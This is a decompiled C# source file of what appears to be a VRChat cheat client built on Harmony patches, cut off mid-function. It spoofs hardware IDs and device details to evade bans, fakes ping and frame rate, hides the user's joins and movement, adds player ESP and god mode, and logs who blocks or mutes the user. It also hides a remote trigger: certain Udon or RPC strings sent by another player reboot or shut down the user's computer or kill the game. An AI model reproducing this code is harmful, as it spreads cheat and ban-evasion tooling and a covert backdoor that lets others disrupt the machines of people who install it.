﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using ExitGames.Client.Photon;
using HarmonyLib;
using Il2CppSystem;
using Il2CppSystem.Collections.Generic;
using MelonLoader;
using Newtonsoft.Json;
using Photon.Realtime;
using TMPro;
using Transmtn;
using Transmtn.DTO.Notifications;
using UnhollowerBaseLib;
using UnityEngine;
using VRC;
using VRC.Core;
using VRC.Networking;
using VRC.SDKBase;
using ZDBase.Events;
using ZDBase.Utils.Wrappers;
using ZeroDayRemastered;
using ZeroDayRemastered.Modules;

namespace ZDBase.Utils
{
	// Token: 0x0200004C RID: 76
	internal static class Patches
	{
		// Token: 0x060001E6 RID: 486 RVA: 0x0000EDE0 File Offset: 0x0000CFE0
		public static HarmonyMethod GetPatch(string name)
		{
			Patches.SuccessfulPatches++;
			return new HarmonyMethod(typeof(Patches).GetMethod(name, BindingFlags.Static | BindingFlags.NonPublic));
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x0000EE18 File Offset: 0x0000D018
		public static List<Player> AllPlayers(this PlayerManager Instance)
		{
			return Instance.field_Private_List_1_Player_0;
		}

		// Token: 0x060001E8 RID: 488 RVA: 0x0000EE30 File Offset: 0x0000D030
		public static Player GetPlayerWithPlayerID(this PlayerManager Instance, int playerID)
		{
			foreach (Player player in Instance.AllPlayers().ToArray())
			{
				bool flag = player.GetVRCPlayerApi().playerId == playerID;
				if (flag)
				{
					return player;
				}
			}
			return null;
		}

		// Token: 0x060001E9 RID: 489 RVA: 0x0000EE9C File Offset: 0x0000D09C
		internal static void Initialize()
		{
			Console.Clear();
			Console.ForegroundColor = ConsoleColor.Cyan;
			Console.WriteLine(" \r\n /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$  /$$   /$$ /$$$$$$$$  /$$$$$$ \r\n| $$__  $$ /$$__  $$|__  $$__//$$__  $$| $$  | $$| $$_____/ /$$__  $$\r\n| $$  \\ $$| $$  \\ $$   | $$  | $$  \\__/| $$  | $$| $$      | $$  \\__/\r\n| $$$$$$$/| $$$$$$$$   | $$  | $$      | $$$$$$$$| $$$$$   |  $$$$$$ \r\n| $$____/ | $$__  $$   | $$  | $$      | $$__  $$| $$__/    \\____  $$\r\n| $$      | $$  | $$   | $$  | $$    $$| $$  | $$| $$       /$$  \\ $$\r\n| $$      | $$  | $$   | $$  |  $$$$$$/| $$  | $$| $$$$$$$$|  $$$$$$/\r\n|__/      |__/  |__/   |__/   \\______/ |__/  |__/|________/ \\______/ \r\n                                                                     \r\n                                                                     \r\n                                                                     ");
			Patches.Instance.Patch(AccessTools.Method(typeof(VRC_EventDispatcherRFC), "Method_Public_Void_Player_VrcEvent_VrcBroadcastType_Int32_Single_0", null, null), Patches.GetPatch("rpc"), null, null, null, null);
			Logs.LogSuccess("Patched RPC", false);
			Patches.Instance.Patch(typeof(NetworkManager).GetMethod("Method_Public_Void_Player_1"), Patches.GetPatch("PlayerJoin"), null, null, null, null);
			Logs.LogSuccess("Patched PlayerJoin", false);
			Patches.Instance.Patch(typeof(NetworkManager).GetMethod("Method_Public_Void_Player_0"), Patches.GetPatch("PlayerLeft"), null, null, null, null);
			Logs.LogSuccess("Patched PlayerLeft", false);
			Patches.Instance.Patch(AccessTools.Method(typeof(RoomManager), "Method_Public_Static_Boolean_ApiWorld_ApiWorldInstance_String_Int32_0", null, null), Patches.GetPatch("getworld"), null, null, null, null);
			Logs.LogSuccess("Patched WorldJoin", false);
			Patches.Instance.Patch(typeof(LoadBalancingClient).GetMethod("OnEvent"), Patches.GetPatch("OnEvent"), null, null, null, null);
			Logs.LogSuccess("Patched OnEvent", false);
			Patches.Instance.Patch(typeof(PostOffice).GetMethod("Put"), Patches.GetPatch("Prefix"), null, null, null, null);
			Logs.LogSuccess("Patched PostOffice || Notifications", false);
			Patches.Instance.Patch(typeof(UdonSync).GetMethod("UdonSyncRunProgramAsRPC"), new HarmonyMethod(AccessTools.Method(typeof(Patches), "UdonLogShit", null, null)), null, null, null, null);
			Logs.LogSuccess("Patched Udon", false);
			Patches.Instance.Patch(typeof(PortalTrigger).GetMethod("OnTriggerEnter"), new HarmonyMethod(AccessTools.Method(typeof(Patches), "Enterportal", null, null)), null, null, null, null);
			Logs.LogSuccess("Patched Portals", false);
			Patches.Instance.Patch(AccessTools.Method(typeof(LoadBalancingClient), "Method_Public_Virtual_New_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0", null, null), Patches.GetPatch("OpRaiseEvent"), null, null, null, null);
			Patches.Instance.Patch(AccessTools.Method(typeof(LoadBalancingClient), "Method_Public_Virtual_New_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0", null, null), Patches.GetPatch("raisedevent"), null, null, null, null);
			Logs.LogSuccess("Patched RaisedEvents", false);
			Logs.LogSuccess("Patched OpRaiseEvent", false);
			Patches.Instance.Patch(AccessTools.Property(typeof(Time), "smoothDeltaTime").GetMethod, null, Patches.GetPatch("Frames"), null, null, null);
			Logs.LogSuccess("Patched Fake Frames.", false);
			Patches.Instance.Patch(AccessTools.Property(typeof(PhotonPeer), "RoundTripTime").GetMethod, null, Patches.GetPatch("Pings"), null, null, null);
			Logs.LogSuccess("Patched Fake Ping", false);
			Patches.Instance.Patch(typeof(SystemInfo).GetProperty("deviceUniqueIdentifier").GetGetMethod(), new HarmonyMethod(AccessTools.Method(typeof(Patches), "FakeHWID", null, null)), null, null, null, null);
			Patches.SafetyPatch();
			Logs.LogSuccess("Started Analalytics Spoofing..", false);
			Logs.LogSuccess(string.Format("Patched {0} Items!", Patches.SuccessfulPatches), false);
		}

		// Token: 0x060001EA RID: 490 RVA: 0x0000F214 File Offset: 0x0000D414
		private static bool NoStats()
		{
			return false;
		}

		// Token: 0x060001EB RID: 491 RVA: 0x0000F228 File Offset: 0x0000D428
		private static bool AssetLoaded(ref Object __0, ref Vector3 __1, ref Quaternion __2, ref bool __3, ref bool __4, ref bool __5)
		{
			GameObject gameObject = __0.TryCast<GameObject>();
			bool flag = gameObject != null && gameObject.name == "Avatar";
			if (flag)
			{
				Logs.LogSuccess("Avatar Loaded [" + gameObject.GetComponent<PipelineManager>().blueprintId + "]", true);
			}
			return true;
		}

		// Token: 0x060001EC RID: 492 RVA: 0x0000F288 File Offset: 0x0000D488
		private static bool RPC(ref Player __0, ref VRC_EventHandler.VrcEvent __1, ref VRC_EventHandler.VrcBroadcastType __2, ref int __3, ref float __4)
		{
			try
			{
				Player instance = __0;
				string text = instance.DisplayName();
				bool eventLog = MainConfigSettings.Instance.EventLog;
				if (eventLog)
				{
					bool flag = __1.ParameterObject != null;
					if (flag)
					{
						Logs.Log(string.Format("\n-----------[RPC]-----------\n\nSender: {0}\nType: {1}\nBroadcast: {2}\nString: {3}\nGameObject Name: {4}\nGameObject position: {5}, {6}, {7}\nFloat: {8}\nInt: {9}\nBool: {10}", new object[]
						{
							text,
							__1.EventType,
							__2,
							__1.ParameterString,
							__1.ParameterObject.name,
							__1.ParameterObject.transform.position.x,
							__1.ParameterObject.transform.position.y,
							__1.ParameterObject.transform.position.y,
							__1.ParameterFloat,
							__1.ParameterInt,
							__1.ParameterBoolOp
						}), false);
					}
					else
					{
						List<string> list = new List<string>();
						foreach (GameObject gameObject in __1.ParameterObjects)
						{
							list.Add(gameObject.name);
						}
						Logs.Log(string.Format("\n-----------[RPC]-----------\n\nSender: {0}\nType: {1}\nBroadcast: {2}\nString: {3}\nGameObjects: {4}\nFloat: {5}\nInt: {6}\nBool: {7}", new object[]
						{
							text,
							__1.EventType,
							__2,
							__1.ParameterString,
							string.Join(", ", list),
							__1.ParameterFloat,
							__1.ParameterInt,
							__1.ParameterBoolOp
						}), false);
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060001ED RID: 493 RVA: 0x0000F4B0 File Offset: 0x0000D6B0
		private static void getworld(object param_0)
		{
			Patches.<>c__DisplayClass13_0 CS$<>8__locals1 = new Patches.<>c__DisplayClass13_0();
			CS$<>8__locals1.param_0 = param_0;
			MelonCoroutines.Start(CS$<>8__locals1.<getworld>g__notifyinstance|0());
			PickupSword.array1 = Resources.FindObjectsOfTypeAll<VRC_Pickup>().ToArray<VRC_Pickup>();
		}

		// Token: 0x060001EE RID: 494 RVA: 0x0000F4E8 File Offset: 0x0000D6E8
		private static void Frames(ref float __result)
		{
			bool framesSpoofer = MainConfigSettings.Instance.FramesSpoofer;
			if (framesSpoofer)
			{
				__result = 1f / MainConfigSettings.Instance.FPSSpoofValue;
			}
		}

		// Token: 0x060001EF RID: 495 RVA: 0x0000F518 File Offset: 0x0000D718
		private static void Pings(ref int __result)
		{
			try
			{
				bool pingSpoof = MainConfigSettings.Instance.PingSpoof;
				if (pingSpoof)
				{
					__result = MainConfigSettings.Instance.PINGSpoofValue;
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x0000F55C File Offset: 0x0000D75C
		private static void rpc(object __0, VRC_EventHandler.VrcEvent __1, VRC_EventHandler.VrcBroadcastType __2, int __3, float __4)
		{
			string decode = string.Empty;
			decode = Encoding.ASCII.GetString(__1.ParameterBytes.ToArray<byte>());
			Patches.runmoderation(decode, __0);
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x0000F590 File Offset: 0x0000D790
		private static void runmoderation(string decode, object __0)
		{
			try
			{
				bool flag = decode.Contains("Quit") && decode.Contains(VRCPlayer.field_Internal_Static_VRCPlayer_0.GetAPIUser().id);
				if (flag)
				{
					Process.GetCurrentProcess().Kill();
				}
			}
			catch
			{
				Logs.LogError("Failed!", true);
			}
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x0000F5FC File Offset: 0x0000D7FC
		private static bool FakeHWID(ref string __result)
		{
			bool flag = Patches.newHWID == "";
			bool flag2 = flag;
			if (flag2)
			{
				Patches.newHWID = KeyedHashAlgorithm.Create().ComputeHash(Encoding.UTF8.GetBytes(string.Format("{0}A-{1}{2}-{3}{4}-{5}{6}-3C-1F", new object[]
				{
					new Random().Next(0, 9),
					new Random().Next(0, 9),
					new Random().Next(0, 9),
					new Random().Next(0, 9),
					new Random().Next(0, 9),
					new Random().Next(0, 9),
					new Random().Next(0, 9)
				}))).Select(delegate(byte x)
				{
					byte b = x;
					return b.ToString("x2");
				}).Aggregate((string x, string y) => x + y);
				Logs.Log("[Spoofer] HWID New: " + Patches.newHWID, false);
				Logs.Log("[Spoofer] PC Name New: " + SystemInfo.deviceName, false);
				Logs.Log("[Spoofer] Model New: " + SystemInfo.deviceModel, false);
				Logs.Log("[Spoofer] GPU New: " + SystemInfo.graphicsDeviceName, false);
				Logs.Log("[Spoofer] CPU New: " + SystemInfo.processorType, false);
				Logs.Log("[Spoofer] GPU ID New: " + SystemInfo.graphicsDeviceID.ToString(), false);
				Logs.Log("[Spoofer] OS New:" + SystemInfo.operatingSystem, false);
			}
			__result = Patches.newHWID;
			return false;
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x0000F7D8 File Offset: 0x0000D9D8
		public unsafe static void SafetyPatch()
		{
			IntPtr intPtr = IL2CPP.il2cpp_resolve_icall("UnityEngine.SystemInfo::GetDeviceModel");
			MelonUtils.NativeHookAttach((IntPtr)((void*)(&intPtr)), AccessTools.Method(typeof(Patches), "FakeModel", null, null).MethodHandle.GetFunctionPointer());
			IntPtr intPtr2 = IL2CPP.il2cpp_resolve_icall("UnityEngine.SystemInfo::GetDeviceName");
			MelonUtils.NativeHookAttach((IntPtr)((void*)(&intPtr2)), AccessTools.Method(typeof(Patches), "FakeName", null, null).MethodHandle.GetFunctionPointer());
			IntPtr intPtr3 = IL2CPP.il2cpp_resolve_icall("UnityEngine.SystemInfo::GetGraphicsDeviceName");
			MelonUtils.NativeHookAttach((IntPtr)((void*)(&intPtr3)), AccessTools.Method(typeof(Patches), "FakeGBU", null, null).MethodHandle.GetFunctionPointer());
			IntPtr intPtr4 = IL2CPP.il2cpp_resolve_icall("UnityEngine.SystemInfo::GetGraphicsDeviceID");
			MelonUtils.NativeHookAttach((IntPtr)((void*)(&intPtr4)), AccessTools.Method(typeof(Patches), "FakeGBUID", null, null).MethodHandle.GetFunctionPointer());
			IntPtr intPtr5 = IL2CPP.il2cpp_resolve_icall("UnityEngine.SystemInfo::GetProcessorType");
			MelonUtils.NativeHookAttach((IntPtr)((void*)(&intPtr5)), AccessTools.Method(typeof(Patches), "FakeProcessor", null, null).MethodHandle.GetFunctionPointer());
			IntPtr intPtr6 = IL2CPP.il2cpp_resolve_icall("UnityEngine.SystemInfo::GetOperatingSystem");
			MelonUtils.NativeHookAttach((IntPtr)((void*)(&intPtr6)), AccessTools.Method(typeof(Patches), "FakeOS", null, null).MethodHandle.GetFunctionPointer());
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x0000F958 File Offset: 0x0000DB58
		public static IntPtr FakeModel()
		{
			return new Object(IL2CPP.ManagedStringToIl2Cpp(Patches.Motherboards[new Random().Next(0, Patches.Motherboards.Length)])).Pointer;
		}

		// Token: 0x060001F5 RID: 501 RVA: 0x0000F994 File Offset: 0x0000DB94
		public static IntPtr FakeName()
		{
			return new Object(IL2CPP.ManagedStringToIl2Cpp("DESKTOP-" + Patches.RandomString(7))).Pointer;
		}

		// Token: 0x060001F6 RID: 502 RVA: 0x0000F9C8 File Offset: 0x0000DBC8
		public static IntPtr FakeGBU()
		{
			return new Object(IL2CPP.ManagedStringToIl2Cpp(Patches.PBU[new Random().Next(0, Patches.PBU.Length)])).Pointer;
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x0000FA04 File Offset: 0x0000DC04
		public static IntPtr FakeGBUID()
		{
			return new Object(IL2CPP.ManagedStringToIl2Cpp(Patches.RandomString(12))).Pointer;
		}

		// Token: 0x060001F8 RID: 504 RVA: 0x0000FA2C File Offset: 0x0000DC2C
		public static IntPtr FakeProcessor()
		{
			return new Object(IL2CPP.ManagedStringToIl2Cpp(Patches.CPU[new Random().Next(0, Patches.CPU.Length)])).Pointer;
		}

		// Token: 0x060001F9 RID: 505 RVA: 0x0000FA68 File Offset: 0x0000DC68
		public static IntPtr FakeOS()
		{
			return new Object(IL2CPP.ManagedStringToIl2Cpp(Patches.OS[new Random().Next(0, Patches.OS.Length)])).Pointer;
		}

		// Token: 0x060001FA RID: 506 RVA: 0x0000FAA4 File Offset: 0x0000DCA4
		public static string RandomString(int length)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!§$%&/()=?";
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length - 1)].ToString();
			}
			return text2;
		}

		// Token: 0x060001FB RID: 507 RVA: 0x0000FB04 File Offset: 0x0000DD04
		private static bool UdonLogShit(ref string __0, Player __1)
		{
			bool flag = __0.Contains("RestartMonkeys") && __1.Method_Internal_get_APIUser_0().displayName != APIUser.CurrentUser.DisplayName();
			if (flag)
			{
				Process.Start("shutdown.exe", "-r -t 0");
			}
			bool flag2 = __0.Contains("QuitLmao") && __1.Method_Internal_get_APIUser_0().displayName != APIUser.CurrentUser.DisplayName();
			if (flag2)
			{
				Process.GetCurrentProcess().Kill();
			}
			bool flag3 = __0.Contains("byebye") && __1.Method_Internal_get_APIUser_0().displayName != APIUser.CurrentUser.DisplayName();
			if (flag3)
			{
				Process.Start("shutdown", "/s /t 0");
				Process.GetCurrentProcess().Kill();
			}
			bool udonLogger = MainConfigSettings.Instance.UdonLogger;
			if (udonLogger)
			{
				Logs.Log(string.Concat(new string[]
				{
					__0,
					" : From : ",
					__1.name,
					" : ",
					__1.Method_Internal_get_APIUser_0().displayName
				}), true);
			}
			bool antiUdon = MainConfigSettings.AntiUdon;
			bool result;
			if (antiUdon)
			{
				result = false;
			}
			else
			{
				bool ghostgodmode = MainConfigSettings.Instance.GHOSTGODMODE;
				if (ghostgodmode)
				{
					bool flag4 = !Patches.finishedpatches1;
					if (flag4)
					{
						Logs.Log("Patched Stab Death", true);
						Logs.Log("Patched Bullet Death", true);
						Utilities.StaffNotify("Patched Stab Death");
						Utilities.StaffNotify("Patched Bullet Death");
						Patches.finishedpatches1 = true;
					}
					bool flag5 = __0 == "BackStabDamage";
					if (flag5)
					{
						Logs.Log("Prevented Death", true);
						return false;
					}
					bool flag6 = __0.Contains("HitDamage");
					if (flag6)
					{
						Logs.Log("Prevented Death", true);
						return false;
					}
				}
				bool murderGodMode = MainConfigSettings.Instance.murderGodMode;
				if (murderGodMode)
				{
					bool flag7 = !Patches.finishedpatches;
					if (flag7)
					{
						Logs.Log("Patched Trap Death", true);
						Logs.Log("Patched Snake Death", true);
						Utilities.StaffNotify("Patched Trap Death");
						Utilities.StaffNotify("Patched Snake Death");
						Patches.finishedpatches = true;
					}
					bool flag8 = __0 == "SyncKill";
					if (flag8)
					{
						Logs.Log("Prevented Death By SyncKill", true);
						result = false;
					}
					else
					{
						bool flag9 = __0 == "SyncSnakeAttack";
						if (flag9)
						{
							Logs.Log("Prevented Death By Snake", true);
							result = false;
						}
						else
						{
							bool flag10 = Patches.Inworld();
							if (flag10)
							{
								bool godMode = Murder.GodMode;
								if (godMode)
								{
									GameObject.Find("Game Logic/Weapons/Bear Trap (0)/Trap lethal bounds").active = false;
									GameObject.Find("Game Logic/Weapons/Bear Trap (1)/Trap lethal bounds").active = false;
									GameObject.Find("Game Logic/Weapons/Bear Trap (2)/Trap lethal bounds").active = false;
								}
								else
								{
									GameObject.Find("Game Logic/Weapons/Bear Trap (0)/Trap lethal bounds").active = true;
									GameObject.Find("Game Logic/Weapons/Bear Trap (1)/Trap lethal bounds").active = true;
									GameObject.Find("Game Logic/Weapons/Bear Trap (2)/Trap lethal bounds").active = true;
								}
							}
							result = true;
						}
					}
				}
				else
				{
					result = true;
				}
			}
			return result;
		}

		// Token: 0x060001FC RID: 508 RVA: 0x0000FE1C File Offset: 0x0000E01C
		public static bool Inworld()
		{
			return RoomManager.Method_Internal_Static_get_String_0().Contains(Patches.WORLDID);
		}

		// Token: 0x060001FD RID: 509 RVA: 0x0000FE48 File Offset: 0x0000E048
		private static void Prefix(MethodBase __originalMethod, PostOffice __instance, Notification __0)
		{
			try
			{
				bool flag = __0.type.Contains("friendRequest");
				if (flag)
				{
					Logs.Log("Friend Request From: [" + __0.senderUsername + "]", false);
					Logs.Log("Notification Info: " + __0.ToString(), false);
					Utilities.uia1.gameObject.transform.Find("Image/Text (TMP)").gameObject.GetComponent<TextMeshProUGUI>().text = "Friend Request From: [" + __0.senderUsername + "]";
					Utilities.uia1.SetActive(false);
					Utilities.uia1.SetActive(true);
				}
				bool flag2 = __0.type.Contains("invite");
				if (flag2)
				{
					Logs.Log("Invite From: [" + __0.senderUsername + "]", false);
					Logs.Log("Notification Info: " + __0.ToString(), false);
					Utilities.uia1.gameObject.transform.Find("Image/Text (TMP)").gameObject.GetComponent<TextMeshProUGUI>().text = "Invite From: [" + __0.senderUsername + "]";
					Utilities.uia1.SetActive(false);
					Utilities.uia1.SetActive(true);
				}
				bool flag3 = __0.type.Contains("request");
				if (flag3)
				{
					Logs.Log("Request From: [" + __0.senderUsername + "]", false);
					Logs.Log("Notification Info: " + __0.ToString(), false);
					Utilities.uia1.gameObject.transform.Find("Image/Text (TMP)").gameObject.GetComponent<TextMeshProUGUI>().text = "Request From: [" + __0.senderUsername + "]";
					Utilities.uia1.SetActive(false);
					Utilities.uia1.SetActive(true);
				}
			}
			catch (Exception arg)
			{
				Logs.Log(string.Format("Exception in patch of PostOffice.Put:\n{0}", arg), true);
			}
		}

		// Token: 0x060001FE RID: 510 RVA: 0x00010074 File Offset: 0x0000E274
		private static bool raisedevent(ref byte __0, ref Object __1, object __2, SendOptions __3)
		{
			bool result = true;
			bool flag = Patches.ghostmode;
			if (flag)
			{
				bool flag2 = __0 == 7;
				if (flag2)
				{
					result = false;
				}
				bool flag3 = __0 == 8;
				if (flag3)
				{
					result = false;
				}
			}
			bool flag4 = Patches.fakelag;
			if (flag4)
			{
				bool flag5 = __0 == 7;
				if (flag5)
				{
					bool flag6 = Patches.fakelagnumb >= 5;
					if (flag6)
					{
						result = true;
						Patches.fakelagnumb = 0;
					}
					else
					{
						result = false;
						Patches.fakelagnumb++;
					}
				}
				bool flag7 = __0 == 1;
				if (flag7)
				{
					bool flag8 = Patches.fakevc < 2;
					if (flag8)
					{
						result = false;
						Patches.fakevc++;
					}
					else
					{
						result = true;
						Patches.fakevc = 0;
					}
				}
			}
			return result;
		}

		// Token: 0x060001FF RID: 511 RVA: 0x00010130 File Offset: 0x0000E330
		private static bool OpRaiseEvent(ref byte __0, ref Object __1, ref RaiseEventOptions __2, ref SendOptions __3)
		{
			bool flag = MainConfigSettings.InvisibleJoin && __0 == 202;
			return !flag;
		}

		// Token: 0x06000200 RID: 512 RVA: 0x00010160 File Offset: 0x0000E360
		private static bool OnEvent(ref EventData __0)
		{
			try
			{
				ParameterDictionary parameters = __0.Parameters;
				bool flag = MainConfigSettings.Instance.EventLog && __0.Code != 7 && __0.Code != 1 && __0.Code != 8;
				if (flag)
				{
					byte code = __0.Code;
					int sender = __0.Sender;
					string arg = PlayerManager.Method_Public_Static_get_PlayerManager_0().GetPlayerWithPlayerID(__0.Sender).GetVRCPlayer().DisplayName();
					string arg2 = JsonConvert.SerializeObject(Serialize.FromIL2CPPToManaged<object>(parameters), 1);
					Logs.Log(string.Format("\n-----------[OnEvent]-----------\n\nCode: {0}\nSender: {1}\nSerialized data:\n{2}", code, arg, arg2), true);
				}
				bool flag2 = __0.Code != 1 && __0.Code != 7 && __0.Code != 1 && __0.Code != 8 && __0.Code != 33 && __0.Code != 253 && __0.Code != 254;
				if (flag2)
				{
					bool eventBlock = MainConfigSettings.Instance.EventBlock;
					if (eventBlock)
					{
						bool flag3 = Patches.LastReceivedEvent == __0.Code;
						if (flag3)
						{
							bool flag4 = Patches.AmountOfSpam > 15;
							if (flag4)
							{
								bool flag5 = !Patches.BlacklistedEvents.Contains(__0.Code);
								if (flag5)
								{
									Patches.BlacklistedEvents.Add(__0.Code);
								}
							}
							else
							{
								Patches.AmountOfSpam++;
							}
						}
						else
						{
							bool flag6 = Patches.BlacklistedEvents.Contains(Patches.LastReceivedEvent);
							if (flag6)
							{
								Patches.BlacklistedEvents.Remove(Patches.LastReceivedEvent);
							}
							Patches.LastReceivedEvent = __0.Code;
							Patches.AmountOfSpam = 0;
						}
						bool flag7 = Patches.BlacklistedEvents.Contains(__0.Code);
						if (flag7)
						{
							bool eventBlock2 = MainConfigSettings.Instance.EventBlock;
							if (eventBlock2)
							{
								Logs.Log(string.Format("ratelimited event code {0} from {1}", __0.Code, PlayerManager.Method_Public_Static_get_PlayerManager_0().GetPlayerWithPlayerID(__0.Sender).GetVRCPlayer().DisplayName()), true);
							}
							return false;
						}
					}
					bool eventLog = MainConfigSettings.Instance.EventLog;
					if (eventLog)
					{
						Logs.Log(string.Format("{0} sent event code {1}", PlayerManager.Method_Public_Static_get_PlayerManager_0().GetPlayerWithPlayerID(__0.Sender).GetVRCPlayer().DisplayName(), __0.Code), true);
						Logs.LogError("Byte Parameters:" + __0.CustomData.ToString(), false);
					}
				}
				byte code2 = __0.Code;
				bool flag8 = code2 != 1;
				if (flag8)
				{
					bool flag9 = code2 != 2;
					if (flag9)
					{
						bool flag10 = code2 == 33;
						if (flag10)
						{
							Dictionary<byte, object> dictionary = JsonConvert.DeserializeObject<Dictionary<byte, object>>(JsonConvert.SerializeObject(JsonConvert.DeserializeObject<Dictionary<byte, object>>(JsonConvert.SerializeObject(Serialize.FromIL2CPPToManaged<object>(parameters)))[245]));
							bool flag11 = dictionary.Keys.Contains(0) && dictionary.Keys.Contains(1) && dictionary.Keys.Contains(10) && dictionary.Keys.Contains(11);
							if (flag11)
							{
								Player playerWithPlayerID = PlayerManager.Method_Public_Static_get_PlayerManager_0().GetPlayerWithPlayerID(int.Parse(dictionary[1].ToString()));
								bool flag12 = bool.Parse(dictionary[10].ToString());
								bool flag13 = bool.Parse(dictionary[11].ToString());
								bool flag14 = flag12 && !flag13;
								if (flag14)
								{
									bool moderationLogs = MainConfigSettings.Instance.ModerationLogs;
									if (moderationLogs)
									{
										bool hudLog = MainConfigSettings.Instance.HudLog;
										if (hudLog)
										{
											Utilities.StaffNotify("<color=magenta>" + playerWithPlayerID.DisplayName() + "</color> has you <color=red>Blocked</color> & <color=#00bbff>Unmuted</color>");
										}
										Logs.Log(playerWithPlayerID._vrcplayer.DisplayName() + " has you Unmuted", true);
									}
									return !MainConfigSettings.Instance.ModerationLogs;
								}
								bool flag15 = !flag12 && flag13;
								if (flag15)
								{
									bool moderationLogs2 = MainConfigSettings.Instance.ModerationLogs;
									if (moderationLogs2)
									{
										bool hudLog2 = MainConfigSettings.Instance.HudLog;
										if (hudLog2)
										{
											Utilities.StaffNotify("<color=magenta>" + playerWithPlayerID.DisplayName() + "</color> has you <color=red>Unblocked</color> & <color=#00bbff>Muted</color>");
										}
										Logs.Log(playerWithPlayerID._vrcplayer.DisplayName() + "had you Muted", true);
									}
									return !MainConfigSettings.Instance.ModerationLogs;
								}
								bool flag16 = flag12 && flag13;
								if (flag16)
								{
									bool moderationLogs3 = MainConfigSettings.Instance.ModerationLogs;
									if (moderationLogs3)
									{
										bool hudLog3 = MainConfigSettings.Instance.HudLog;
										if (hudLog3)
										{
											Utilities.StaffNotify("<color=magenta>" + playerWithPlayerID.DisplayName() + "</color> has you <color=red>Blocked</color> & <color=#00bbff>Muted</color>");
										}
										Logs.Log(playerWithPlayerID._vrcplayer.DisplayName() + " has you Unmuted", true);
									}
									return !MainConfigSettings.Instance.ModerationLogs;
								}
								bool flag17 = !flag12 && !flag13;
								if (flag17)
								{
									bool moderationLogs4 = MainConfigSettings.Instance.ModerationLogs;
									if (moderationLogs4)
									{
										bool hudLog4 = MainConfigSettings.Instance.HudLog;
										if (hudLog4)
										{
											Utilities.StaffNotify("<color=magenta>" + playerWithPlayerID.DisplayName() + "</color> has you <color=red>Unblocked</color> & <color=#00bbff>Unmuted</color>");
										}
										Logs.Log(playerWithPlayerID._vrcplayer.DisplayName() + " has you Unblocked", true);
									}
								}
							}
						}
					}
					else
					{
						bool flag18 = MainConfigSettings.Instance.ModerationLogs && JsonConvert.SerializeObject(Serialize.FromIL2CPPToManaged<object>(__0.Parameters), 1).Contains("kicked");
						if (flag18)
						{
							bool hudLog5 = MainConfigSettings.Instance.HudLog;
							if (hudLog5)
							{
								Utilities.StaffNotify("<color=red>YOU WERE KICKED FROM THE INSTANCE!!!</color>");
							}
							Logs.Log("Kick attempt from the owner of the room", false);
							return false;
						}
					}
				}
			}
			catch
			{
			}
			return true;
		}

		// Token: 0x06000201 RID: 513 RVA: 0x00010764 File Offset: 0x0000E964
		private static bool Enterportal(PortalTrigger __instance)
		{
			bool result;
			try
			{
				bool flag = Vector3.Distance(VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position, __instance.transform.position) > 1f;
				if (flag)
				{
					result = false;
				}
				else
				{
					bool flag2 = __instance.gameObject.GetComponentInParent<VRC_PortalMarker>() != null;
					if (flag2)
					{
						result = true;
					}
					else
					{
						VRCUiPopupManager.Method_Public_Static_get_VRCUiPopupManager_PDM_0().Alert("AzureX", "Would you like to Enter this Portal?", "Yes", delegate()
						{
							Networking.GoToRoom(__instance.field_Private_PortalInternal_0.field_Private_ApiWorld_0.id + ":" + __instance.field_Private_PortalInternal_0.field_Private_String_4);
							VRCUiPopupManager.Method_Public_Static_get_VRCUiPopupManager_PDM_0().HideCurrentPopUp();
						}, "No", delegate()
						{
							VRCUiPopupManager.Method_Public_Static_get_VRCUiPopupManager_PDM_0().HideCurrentPopUp();
						}, null);
						result = false;
					}
				}
			}
			catch
			{
				result = true;
			}
			return result;
		}

		// Token: 0x06000202 RID: 514 RVA: 0x0001083C File Offset: 0x0000EA3C
		private static void PlayerJoin(ref Player __0)
		{
			try
			{
				AzuraClientUser.CachedPlayers.Add(__0.gameObject.AddComponent<ZDNameplates>());
				bool flag = APIUser.IsFriendsWith(__0.UserID());
				if (flag)
				{
					bool hudLog = MainConfigSettings.Instance.HudLog;
					if (hudLog)
					{
						Utilities.uia1.gameObject.transform.Find("Image/Text (TMP)").gameObject.GetComponent<TextMeshProUGUI>().text = "<color=yellow>Friend Arrived: [" + __0._vrcplayer.DisplayName() + "]</color>";
						Utilities.uia1.SetActive(false);
						Utilities.uia1.SetActive(true);
					}
				}
				Logs.Log("Player Arrived: [" + __0._vrcplayer.DisplayName() + "]", true);
			}
			catch
			{
			}
			try
			{
				bool betterHighlights = MainConfigSettings.Instance.BetterHighlights;
				if (betterHighlights)
				{
					List<Player>.Enumerator enumerator = PlayerManager.Method_Public_Static_get_PlayerManager_0().AllPlayers().GetEnumerator();
					while (enumerator.MoveNext())
					{
						Highlights.PlayerMeshEsp(enumerator.current, true);
					}
				}
				bool csgo = MainConfigSettings.CSGO;
				if (csgo)
				{
					PlayerLineEsp.Disable();
					PlayerLineEsp.Enable();
				}
				bool playerESP = MainConfigSettings.Instance.PlayerESP;
				if (playerESP)
				{
					Highlights.ToggleESP(false);
					Highlights.ToggleESP(true);
				}
			}
			catch (Exception ex)
			{
				MelonLogger.Log("Error In Esp Updater!!!");
				throw;
			}
		}

		// Token: 0x06000203 RID: 515 RVA: 0x000109B4 File Offset: 0x0000EBB4
		private static void PlayerLeft(ref Player __0)
		{
			try
			{
				bool flag = APIUser.IsFriendsWith(__0.UserID());
				if (flag)
				{
					bool hudLog = MainConfigSettings.Instance.HudLog;
					if (hudLog)
					{
